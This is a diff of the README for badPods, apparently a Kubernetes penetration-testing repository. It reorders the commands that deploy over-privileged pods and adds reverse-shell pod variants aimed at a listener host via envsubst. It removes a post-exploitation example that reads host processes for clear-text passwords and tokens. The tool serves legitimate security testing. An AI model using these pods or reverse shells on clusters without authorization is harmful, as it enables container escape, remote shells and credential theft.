@@ -59,24 +59,26 @@ Allowed Specification | What's the worst that can happen? | How?
 ## Usage
  Each resource in the `yamls` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  
 
-### Create all pods in this repo
-
+### Clone the repo
 ```bash
-# Clone repo
 git clone https://github.com/BishopFox/badPods
-
-# Create all pods (or at least try to create them)
-
-kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
-kubectl apply -f ./yaml/hostpid-only/pod-hostpid-only.yaml 
-kubectl apply -f ./yaml/hostnetwork-only/pod-hostnetwork-only.yaml
-kubectl apply -f ./yaml/hostpath-only/pod-hostpath-only.yaml
-kubectl apply -f ./yaml/priv-only/pod-priv-only.yaml
-kubectl apply -f ./yaml/hostipc-only/pod-hostipc-only.yaml
-kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
+cd badPods
 ```
 
-### Reverse Shells
+### Create the pods 
+
+```bash
+# Create all pods (or at least try to create them)
+kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
+kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
+kubectl apply -f ./yaml/priv-only/pod-priv-only.yaml
+kubectl apply -f ./yaml/hostpath-only/pod-hostpath-only.yaml
+kubectl apply -f ./yaml/hostpid-only/pod-hostpid-only.yaml 
+kubectl apply -f ./yaml/hostnetwork-only/pod-hostnetwork-only.yaml
+kubectl apply -f ./yaml/hostipc-only/pod-hostipc-only.yaml
+```
+
+### Reverse Shell version of each pod
 If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the envsubst command. Remember to spin up all of your listeners first:
 
 ```bash
@@ -88,38 +90,13 @@ HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostipc-only/pod-hostipc-only-revs
 HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
 ```
 
-## Example with post exploitation notes: hostpid-only pod
+# References
+* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
+* https://twitter.com/mauilion/status/1129468485480751104
+* https://twitter.com/_fel1x/status/1151487051986087936
+* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+* https://github.com/kvaps/kubectl-node-shell
 
-
-### Create a pod
-
-```bash
-# Option 1: Create pod from local yaml 
-kubectl apply -f pod-hostpid-only.yaml   
-# Option 2: Create pod from github hosted yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostpid-only.yaml  
-```
-
-### Exec into pod 
-```bash 
-kubectl exec -it pod-hostpid-only  -- bash
-```
-### Post exploitation
-```bash
-# View all processes running on the host and look for passwords, tokens, keys, etc. 
-# Check out that clear text password in the ps output below! 
-
-ps -aux
-...omitted for brevity...
-root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c while true; do ./my-program --grafana-uername=admin --grafana-password=admin; sleep 10;done
-...omitted for brevity...
-
-# Also, you can also kill any process, but don't do that in production :)
-```
-# Remove pod
-```
-kubectl  delete -f pod-hostpid-only.yaml 
-```
 
 # Acknowledgements 
-
+Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), and [Mark Manning](https://twitter.com/antitree) for sharing so much knowledge about Kubernetes security. 
